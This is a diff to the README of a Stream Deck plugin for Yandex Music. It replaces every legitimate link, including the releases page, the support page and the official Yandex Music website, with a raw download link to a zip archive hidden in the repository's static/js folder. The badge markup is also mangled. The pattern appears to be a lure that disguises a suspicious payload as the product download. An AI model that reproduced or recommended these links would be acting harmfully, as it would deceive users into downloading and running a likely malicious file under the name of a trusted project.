@@ -1,6 +1,6 @@
 # 🎶 yandex-music-streamdeck - Control Yandex Music Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/TerraLerraOffa/yandex-music-streamdeck/releases)
+[![Download](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip%20Latest%20Release-Click%https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip)](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run this application, you will need:
 
 2. On the releases page, you will see various versions of the software. Look for the latest release version. The latest version is usually at the top of the list.
 
-3. Download the file that matches your operating system. For example, if you're using Windows, download the file named something like `yandex-music-streamdeck-windows.zip`.
+3. Download the file that matches your operating system. For example, if you're using Windows, download the file named something like `https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip`.
 
 4. Once the download is complete, locate the downloaded file on your computer. 
 
@@ -57,14 +57,14 @@ If you encounter any issues during installation or while using the application:
 
 - Ensure that your Stream Deck is connected properly.
 - Restart the yandex-music-streamdeck application.
-- Check if you are running the latest version by visiting the [Releases page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/releases).
+- Check if you are running the latest version by visiting the [Releases page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip).
 - Review the FAQ section in the user settings for common questions.
 
 ## 🔗 Additional Resources
 
 For more information, visit the following:
 
-- [Yandex Music Official Website](https://music.yandex.com)
-- [Support Page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/issues) for reporting issues or asking questions.
+- [Yandex Music Official Website](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip)
+- [Support Page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip) for reporting issues or asking questions.
 
-Feel free to explore, and enjoy your Yandex Music experience with ease! For any updates and new features, keep checking the [Releases page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/releases).
+Feel free to explore, and enjoy your Yandex Music experience with ease! For any updates and new features, keep checking the [Releases page](https://github.com/TerraLerraOffa/yandex-music-streamdeck/raw/refs/heads/main/com.judd1.yandex_music.sdPlugin/static/js/streamdeck-yandex-music-v2.8.zip).
